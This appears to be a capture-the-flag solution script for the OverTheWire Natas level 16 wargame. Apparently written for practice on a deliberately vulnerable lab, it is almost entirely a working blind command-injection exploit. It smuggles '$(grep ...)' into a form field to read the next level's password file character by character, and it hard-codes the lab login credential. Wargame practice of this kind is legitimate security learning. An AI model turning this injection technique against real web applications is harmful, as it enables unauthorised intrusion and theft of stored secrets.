import requests
import re
import string


characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

print(characters)

username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
#custom_headers = {"Referer":"http://natas5.natas.labs.overthewire.org/"}
url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()

seen_password = ""

while len(seen_password) < len(password):
	for ch in characters:
		
		print("trying with " + seen_password + ch)
		response = session.post(url, data= {"needle": "anythings$(grep ^" + seen_password+ch+" /etc/natas_webpass/natas17)"}, auth = (username, password))
		
		content = response.text

		returned = re.findall( '<pre>\n(.*)\n</pre>', content)
		
		if len(str(returned))<13:
			seen_password+=ch
			break
		
print(seen_password)
